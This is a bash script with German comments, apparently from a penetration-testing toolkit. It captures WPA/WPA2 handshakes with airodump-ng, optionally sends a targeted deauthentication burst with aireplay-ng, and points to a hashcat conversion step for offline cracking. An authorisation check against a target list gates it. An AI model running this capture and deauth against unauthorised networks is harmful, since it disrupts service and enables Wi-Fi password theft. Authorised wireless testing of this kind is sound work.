#!/usr/bin/env bash
# handshake-capture.sh - WPA(2)-Handshake auf autorisiertem Netz capturen
#
# Usage: handshake-capture.sh <monitor_iface> <target_bssid> <channel> [target_ssid]
#
# Auth-Gate: BSSID UND SSID (falls angegeben) muessen in targets.yaml stehen.

set -euo pipefail

TOOLKIT="${TOOLKIT:-/mnt/toolkit}"
# shellcheck source=../lib/logging.sh
source "$TOOLKIT/scripts/lib/logging.sh"
# shellcheck source=../lib/auth_check.sh
source "$TOOLKIT/scripts/lib/auth_check.sh"

require_bin airodump-ng
require_bin aireplay-ng

IFACE="${1:-}"
BSSID="${2:-}"
CHANNEL="${3:-}"
SSID="${4:-}"

if [[ -z "$IFACE" || -z "$BSSID" || -z "$CHANNEL" ]]; then
    cat <<EOF
Usage: $0 <monitor_iface> <target_bssid> <channel> [target_ssid]

Beispiel:
  $0 wlan0mon AA:BB:CC:11:22:33 6 MeinHeimWLAN
EOF
    exit 1
fi

require_auth "$BSSID"
[[ -n "$SSID" ]] && require_auth "$SSID"

outdir="$(make_outdir captures handshake-${BSSID//:/})"
prefix="$outdir/capture"

log_info "Starte airodump-ng - cap landet in $outdir"
log_warn "Strg+C wenn 4-way Handshake-Banner erscheint"

# airodump im Vordergrund, mit BSSID-Filter und Channel-Lock
sudo airodump-ng \
    --bssid "$BSSID" \
    --channel "$CHANNEL" \
    --write "$prefix" \
    --output-format pcap,csv \
    "$IFACE" &
AIRO_PID=$!

# Sanftes deauth, nur wenn explizit bestaetigt
sleep 8
echo
log_info "Capture laeuft. Optional: targeted deauth fuer schnelleren Handshake?"
confirm_destructive "Targeted deauth auf BSSID $BSSID (3 Pakete)?"

log_info "Sende 3 deauths"
sudo aireplay-ng --deauth 3 -a "$BSSID" "$IFACE" || log_warn "aireplay failed"

log_info "Warte 30s auf Handshake-Frames, dann Stop"
sleep 30
sudo kill "$AIRO_PID" 2>/dev/null || true
wait "$AIRO_PID" 2>/dev/null || true

cap="$prefix-01.cap"
if [[ -f "$cap" ]]; then
    log_ok "Capture: $cap"
    log_info "Naechster Schritt: pcap-to-hashcat.sh '$cap'"
else
    log_warn "Keine .cap gefunden - airodump hat evtl. anderes Suffix benutzt"
    ls -la "$outdir"
fi
